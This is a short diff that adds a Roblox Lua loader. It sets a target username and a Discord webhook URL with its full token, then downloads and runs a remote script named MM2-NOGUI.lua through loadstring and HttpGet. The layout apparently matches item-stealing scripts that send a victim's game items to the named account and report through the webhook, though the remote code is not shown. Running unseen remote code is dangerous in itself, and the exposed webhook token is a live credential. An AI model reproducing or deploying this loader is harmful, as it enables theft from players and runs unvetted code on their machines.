@@ -1,0 +1,3 @@
+userName = "duxkzin"
+webHook = "https://discord.com/api/webhooks/1294757733341593681/H_WrNRxbtduxFSsULi9cpqRMWgD7iqlXqKr9cnLDgP23GngSXoaEtwKz0OIMdiloZO1V"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnowyV4/VlorpScripts/refs/heads/main/MM2-NOGUI.lua"))()
